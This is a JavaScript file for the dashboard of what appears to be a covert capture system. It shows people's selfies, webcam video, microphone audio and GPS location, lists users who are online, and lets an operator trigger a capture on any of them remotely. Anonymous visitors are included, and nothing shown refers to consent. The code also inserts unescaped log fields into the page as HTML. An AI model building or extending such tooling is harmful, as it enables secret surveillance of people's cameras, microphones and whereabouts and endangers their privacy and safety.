fetch(`${BACKEND_URL}/api/capture-data`)
  .then(res => res.json())
  .then(data => {
    const container = document.getElementById("logs-container");
    const userSet = new Set();
    const userSelect = document.getElementById("user-select");

    container.innerHTML = "";
    userSelect.innerHTML = `
      <option value="">-- Select a user --</option>
      <option value="__anonymous__">Anonymous User</option>
    `;

    data.forEach((log) => {
      if (log.username) userSet.add(log.username);
    });

    [...userSet].forEach(username => {
      const opt = document.createElement("option");
      opt.value = username;
      opt.textContent = username;
      userSelect.appendChild(opt);
    });
  })
  .catch(err => {
    console.error("Failed to fetch logs:", err);
    document.getElementById("logs-container").innerHTML =
      "<p style='color:red;'>❌ Error loading logs</p>";
  });

function triggerSelectedUser() {
  const typedUsername = document.getElementById("manual-username").value.trim();
  const selectedUsername = document.getElementById("user-select").value;

  let finalUsername = typedUsername || (selectedUsername === "__anonymous__" ? null : selectedUsername);

  if (!finalUsername && finalUsername !== null) {
    alert("Please enter or select a username");
    return;
  }

  triggerForUser(finalUsername);
}

function triggerForUser(username) {
  fetch(`${BACKEND_URL}/api/manual-capture`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username })
  })
    .then(res => res.json())
    .then(data => {
      console.log("✔️ Triggered for:", username || "Anonymous", data);
      alert(data.message || "Manual capture triggered.");
    })
    .catch(err => {
      console.error("❌ Trigger error:", err);
      alert("❌ Failed to trigger capture");
    });
}

let allLogs = [];

fetch(`${BACKEND_URL}/api/capture-data`)
  .then(res => res.json())
  .then(data => {
    allLogs = data;
    renderLogs(allLogs);
  });

function applyFilters() {
  const username = document.getElementById("filter-username").value.toLowerCase();
  const trigger = document.getElementById("filter-trigger").value;

  const filtered = allLogs.filter(log => {
    const uname = (log.username || "").toLowerCase();
    const triggered = log.triggeredBy || "";
    return (!username || uname.includes(username)) && (!trigger || triggered === trigger);
  });

  renderLogs(filtered);
}

function resetFilters() {
  document.getElementById("filter-username").value = "";
  document.getElementById("filter-trigger").value = "";
  renderLogs(allLogs);
}

function renderLogs(logs) {
  const container = document.getElementById("logs-container");
  container.innerHTML = "";

  if (!logs.length) {
    container.innerHTML = "<p>No logs found.</p>";
    return;
  }

  logs.forEach((log, index) => {
    const card = document.createElement("div");
    card.className = "log-card";

    const time = new Date(log.createdAt).toLocaleString();
    const username = log.username || "—";

    const videoId = `video-${index}`;
    const audioId = `audio-${index}`;
    const mapId = `map-${index}`;

    const mapButton = document.createElement("button");
    mapButton.textContent = "🗺️ Show Map";
    mapButton.onclick = () => loadMap(index, log.location.lat, log.location.lon);

    const logHeader = document.createElement("div");
    logHeader.className = "log-header";
    logHeader.innerHTML = `
      <span>👤 Triggered By: ${log.triggeredBy}</span>
      <span>🕒 ${time}</span>
      <span>👥 Username: ${username}</span>
      <button onclick="deleteLog('${log._id}')">🗑️ Delete</button>
      <button onclick="downloadLog('${log._id}')">⬇️ Download ZIP</button>
    `;

    const mediaSection = document.createElement("div");
    mediaSection.className = "media";
    mediaSection.innerHTML = `
      <div><strong>📸 Selfie:</strong><br/><img src="${BACKEND_URL}/${log.selfiePath}" /></div>
      <div>
        <strong>🎥 Video with Audio:</strong><br/>
        <video id="${videoId}" controls muted style="max-width: 250px;">
          <source src="${BACKEND_URL}/${log.videoPath}" type="video/webm" />
        </video>
        <audio id="${audioId}" src="${BACKEND_URL}/${log.audioPath}" style="display:none;"></audio>
      </div>
    `;

    const mapContainer = document.createElement("div");
    mapContainer.id = mapId;
    mapContainer.className = "map";
    mapContainer.style = "height: 250px; margin-top: 10px; display: none;";

    card.appendChild(logHeader);
    card.appendChild(mediaSection);
    card.appendChild(mapButton);
    card.appendChild(mapContainer);
    container.appendChild(card);

    const video = document.getElementById(videoId);
    const audio = document.getElementById(audioId);

    if (audio?.src) {
      video.addEventListener("play", () => {
        audio.currentTime = video.currentTime;
        audio.play().catch(e => console.warn("🔇 Audio play blocked:", e));
      });
      video.addEventListener("pause", () => audio.pause());
      video.addEventListener("seeking", () => audio.currentTime = video.currentTime);
      video.addEventListener("volumechange", () => {
        audio.volume = video.volume;
        audio.muted = video.muted;
      });
    }
  });
}

let lastClickedUser = null;

function updateActiveUsers() {
  fetch(`${BACKEND_URL}/api/active-users`)
    .then(res => res.json())
    .then(data => {
      const container = document.getElementById("active-users");
      container.innerHTML = "";

      if (!data.activeUsers?.length) {
        container.textContent = "None";
        return;
      }

      data.activeUsers.forEach(user => {
        const span = document.createElement("span");
        span.textContent = user;
        span.style.cursor = "pointer";
        span.style.marginRight = "10px";
        span.style.textDecoration = "underline";
        span.style.color = user === lastClickedUser ? "green" : "blue";
        span.style.fontWeight = user === lastClickedUser ? "bold" : "normal";
        span.title = "Click to trigger manual capture";

        span.onclick = () => {
          lastClickedUser = user;
          triggerForUser(user);
          updateActiveUsers();
        };

        container.appendChild(span);
      });
    })
    .catch(err => console.error("Active users fetch error:", err));
}

setInterval(updateActiveUsers, 15000);

function deleteLog(id) {
  if (!confirm("Are you sure you want to delete this log?")) return;

  fetch(`${BACKEND_URL}/api/capture-data/${id}`, {
    method: "DELETE"
  })
    .then(res => res.json())
    .then(data => {
      alert(data.message || "Deleted");
      allLogs = allLogs.filter(log => log._id !== id);
      renderLogs(allLogs);
    })
    .catch(err => {
      console.error("❌ Delete error:", err);
      alert("Failed to delete log");
    });
}

document.getElementById("delete-all-button").addEventListener("click", () => {
  if (!confirm("⚠️ Are you sure you want to delete ALL logs and media files? This cannot be undone.")) return;

  fetch(`${BACKEND_URL}/api/capture-data/all`, {
    method: "DELETE"
  })
    .then(res => res.json())
    .then(data => {
      alert(data.message || "All logs deleted.");
      allLogs = [];
      renderLogs([]);
    })
    .catch(err => {
      console.error("❌ Delete all error:", err);
      alert("Failed to delete all logs");
    });
});

function downloadLog(id) {
  const link = document.createElement("a");
  link.href = `${BACKEND_URL}/api/capture-data/${id}/download`;
  link.download = `capture-log-${id}.zip`;
  link.style.display = "none";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function loadMap(index, lat, lon) {
  const mapDiv = document.getElementById(`map-${index}`);
  if (!mapDiv) return;

  if (mapDiv.dataset.loaded === "true") {
    mapDiv.style.display = mapDiv.style.display === "none" ? "block" : "none";
    return;
  }

  const position = { lat, lng: lon };
  const map = new google.maps.Map(mapDiv, {
    center: position,
    zoom: 13
  });
  new google.maps.Marker({ position, map });

  mapDiv.dataset.loaded = "true";
  mapDiv.style.display = "block";
}